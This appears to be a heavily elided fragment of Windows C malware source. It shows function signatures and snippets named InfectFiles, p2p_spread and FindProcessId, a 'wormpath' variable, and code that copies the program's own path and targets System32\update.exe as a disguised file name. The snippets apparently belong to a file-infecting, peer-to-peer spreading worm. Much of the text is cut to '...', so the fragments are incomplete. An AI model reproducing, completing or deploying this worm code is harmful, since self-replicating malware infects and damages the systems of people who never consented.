                     ...
                     int nCmdShow)
{
 ...
 HMODULE hMe = GetModuleHandle(((void *)0));
...
DWORD FindProcessId(const char *processName)
{
 ...
 HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, ((void *)0));
...
int InfectFiles(void)
{
 ...
 HANDLE fHandle;
 char MyFile[256];
 GetModuleFileName(((void *)0),MyFile,sizeof(MyFile));
...
void p2p_spread(void)
{
 ...
 GetModuleFileName(((void *)0), wormpath, MAX_PATH);
 strcat(windir, "\\System32\\update.exe");
 VIRTUALIZER_END
}
